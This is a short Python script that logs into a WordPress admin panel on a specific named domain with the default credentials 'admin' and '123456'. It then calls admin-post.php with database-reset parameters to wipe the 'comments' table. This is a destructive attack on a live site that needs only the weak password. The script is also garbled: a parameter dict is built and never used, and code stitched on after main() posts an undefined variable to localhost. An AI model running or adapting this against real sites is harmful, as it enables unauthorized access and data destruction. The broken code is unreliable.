import requests

from OldVersion.http_handler import HTTPRequest

def main():
    url = "http://elro.eliranm.co/wp-login.php"
    http = HTTPRequest()
    headers = {'Content-type': 'application/x-www-form-urlencoded',
               'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
    parameters = {'log': "admin", 'pwd': "123456", 'wp-submit': 'Login',
                  'testcookie': '1'}
    response = http.request(url, "POST", parameters=parameters, type="requests", headers=headers,
                                  proxies=None)
    if response is None:
        print("Failed login.")
        exit(-1)
    elif str(response[0]['set-cookie'].split(" ")[-1]).lower() == 'httponly':
        print("Login - sucess")
    print("Trying post.....")
    tables = ['posts']
    headers = {'Content-type': 'application/x-www-form-urlencoded',
               'Cookie': response[0]['set-cookie']
               }
    bsm = {
        'db-reset-tables' : tables,
        'db-reset-code': "11111",
        'db-reset-code-confirm': "11111",
    }
    parameters = {'bsmSelectbsmContainer0': bsm}

    response = http.request("http://elro.eliranm.co/wp-admin/admin-post.php?db-reset-tables%5B%5D=comments&db-reset-code=123456&db-reset-code-confirm=123456", "GET", type="requests", headers=headers,
                                  proxies=None)
    if response is None:
        print("Failed Post.")
        exit(-1)
    else:
        print(response.headers)


s = requests.Session()
s.post('https://localhost/login.py', parameters)
#logged in! cookies saved for future requests.
r2 = s.get('https://localhost/profile_data.json', ...)
#cookies sent automatically!
#do whatever, s will keep your cookies intact :)

if __name__ == '__main__':
    main()
